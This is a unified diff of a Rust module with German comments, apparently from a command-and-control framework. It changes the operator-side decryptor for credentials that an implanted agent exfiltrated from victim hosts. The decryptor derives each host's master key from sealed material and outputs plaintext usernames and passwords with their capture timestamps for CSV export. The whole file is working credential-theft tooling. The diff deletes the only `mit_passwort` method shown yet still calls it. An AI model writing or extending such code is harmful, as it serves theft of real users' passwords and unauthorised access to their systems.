@@ -4,29 +4,18 @@
 //! den Master-Key eines Hosts aus dessen versiegeltem Material und
 //! entschlüsselt damit die Secrets dieses Hosts — auf seinem Rechner, nicht
 //! auf dem Server.
+//!
+//! Das Ergebnis ist **derselbe Typ** wie die Eingabe. Es gab vorher einen
+//! zweiten Typ (`Klartext`) für denselben Sachverhalt, ohne `id` und ohne
+//! `collected_at`; der Export baute ihn zurück und verlor dabei beide Felder —
+//! im entschlüsselten CSV-Export stand der Erfassungszeitpunkt in **jeder**
+//! Zeile leer, obwohl die Spalte existiert.
 
 use std::collections::HashMap;
 use std::path::Path;
 
 use kx_core::c2::{ExfiltratedSecret, Host};
 use kx_core::hostkey::{ServerKeyBundle, ServerKeyPair};
-
-/// Ein entschlüsseltes Secret.
-pub struct Klartext {
-    pub host_id: String,
-    pub cred_type: String,
-    pub username: String,
-    pub password: String,
-    pub source: String,
-}
-
-impl Klartext {
-    /// Setzt das entschluesselte Passwort.
-    fn mit_passwort(mut self, wert: &str) -> Self {
-        self.password = wert.to_string();
-        self
-    }
-}
 
 /// Der Entschüsselungskontext des Operators.
 pub struct Decryptor {
@@ -70,7 +59,16 @@ impl Decryptor {
     ///
     /// Secrets ohne versiegeltes Material bleiben unentschlüsselt — sie wurden
     /// vom Agenten ohne Server-Schlüssel im Klartext gemeldet.
-    pub fn decrypt_all(&self, hosts: &[Host], secrets: &[ExfiltratedSecret]) -> Vec<Klartext> {
+    ///
+    /// Jedes Ergebnis trägt **alle** Felder der Eingabe: `id` und
+    /// `collected_at` eingeschlossen. Das Passwort steht im Klartextfeld, das
+    /// versiegelte Feld ist leer — der Operator hat den Klartext, ein zweites
+    /// Mal wäre es doppelt.
+    pub fn decrypt_all(
+        &self,
+        hosts: &[Host],
+        secrets: &[ExfiltratedSecret],
+    ) -> Vec<ExfiltratedSecret> {
         let master_keys = self.master_keys(hosts);
         let mut out = Vec::new();
         for secret in secrets {
@@ -85,12 +83,15 @@ impl Decryptor {
             };
             let wert = passwort.unwrap_or_else(|| secret.password.clone());
             out.push(
-                Klartext {
+                ExfiltratedSecret {
+                    id: secret.id.clone(),
                     host_id: secret.host_id.clone(),
                     cred_type: secret.cred_type.clone(),
                     username: secret.username.clone(),
                     password: String::new(),
                     source: secret.source.clone(),
+                    collected_at: secret.collected_at.clone(),
+                    sealed_password: String::new(),
                 }
                 .mit_passwort(&wert),
             );
